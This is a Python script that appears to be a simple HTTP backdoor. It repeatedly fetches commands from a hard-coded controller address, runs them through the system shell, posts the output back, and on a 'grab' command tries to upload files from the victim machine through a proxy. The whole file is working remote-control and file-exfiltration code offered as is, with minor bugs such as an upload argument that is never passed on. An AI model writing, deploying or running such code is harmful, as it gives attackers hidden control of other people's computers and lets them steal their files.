import requests
import subprocess
import time
import os

url = "http://172.26.47.11"


def sendPost(Url, data, files=None):
    response = requests.post(url=Url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=data)
    return response


while True:
    req = requests.get(url)
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            newUrl = url + '/store'
            files = {'file': open(path, 'rb')}
            r = sendPost(url, files=files)
        else:
            r = sendPost(url, data='[-]File Not Found')
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = sendPost(url, CMD.stdout.read())
        post_response = sendPost(url, CMD.stderr.read())

    time.sleep(3)
